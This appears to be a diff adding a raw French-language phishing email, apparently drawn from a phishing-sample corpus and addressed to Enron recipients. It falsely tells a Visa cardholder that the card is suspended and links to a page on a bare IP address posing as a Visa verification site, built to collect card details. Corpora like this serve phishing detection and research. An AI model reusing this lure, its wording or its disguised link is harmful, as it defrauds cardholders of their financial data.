@@ -1,0 +1,57 @@
+From
+: example@attack.com
+From: agoldschmidt@earthlink.net
+To: brenna.neves@enron.com, regina.blackshear@enron.com, 
+Subject: Votre Carte Bancaire est suspendue
+Date: Mon, 5 Jul 2010 07:04:31 -0700
+MIME-Version: 1.0
+Content-Type: text/html;
+	charset="Windows-1251"
+Content-Transfer-Encoding: 7bit
+X-Priority: 1
+X-MSMail-Priority: High
+X-Mailer: Microsoft Outlook Express 6.00.2600.0000
+X-MimeOLE: Produced By Microsoft MimeOLE V6.00.2600.0000
+Message-Id: <20100707110059.9D5EA232007@mail.monkey.org>
+Content-Length: 1791
+Lines: 35
+Status: RO
+X-Status: 
+X-Keywords:                 
+X-UID: 1570
+
+<body>
+
+<div id="readMsgBodyContainer" class="ReadMsgBody BorderTop" onclick="return Control.invoke('ReadingPane', '_onBodyClick', event);">
+	<div class="ExternalClass" id="MsgContainer">
+		<blockquote>
+			<p>
+			<img src="http://www.bknd.com/images/visa-vbv.gif" width="137" height="68"></p>
+			<p><span style="font-weight: bold;">
+			<span style="cursor: pointer;" class="ecxyshortcuts" id="ecxlw_1278262471_0">
+			Cher</span> Client Carte Visa,</span> </p>
+			<p>Il a t port  notre attention que votre carte Visa 
+			informations doit tre ractive&nbsp;<br>
+			as part of our continuing commitment to protect your card&nbsp;and pour 
+			rduire<br>
+			l'instance de la fraude.<br>
+			Une fois que vous avez ractiv votre carte Visa documents, votre 
+			carte<br>
+			service ne sera pas interrompu et continuera comme d'habitude.</p>
+			<p>Votre numro d'identification du cas est la suivante:<span style="font-weight: bold; color: rgb(0, 0, 3);">YSZ477DS582LT</span></p>
+			<p>Pour ractiver votre carte Visa cliquez sur le lien suivant:</p>
+			<p>
+			<a rel="nofollow" target="_blank" href="http://64.6.242.48/~ambemusi/gallery/css/visa.fr/MasterCard/Confirmation.aspx/index.html?action=http://www.visaeurope.ch/fr/visa_au_quotidien/verified.jsp">
+			<span class="ecxyshortcuts" id="ecxlw_1278262471_1">S'il vous plat 
+			cliquez sur ici pour vrifier votre identit</span></a></p>
+			<span style="font-weight: bold;">Dfaut de vrifier votre dossiers 
+			se traduira par carte Suspension</span>
+  			<p style="font-weight: bold; font-family: Verdana;"><small><small>
+			Service Carte de crdit.</small></small></p>
+			<small><small>
+			<span style="font-weight: bold; font-family: Verdana;">International 
+			Scurit</span></small></small></blockquote>
+	</div>
+</div>
+
+</body>
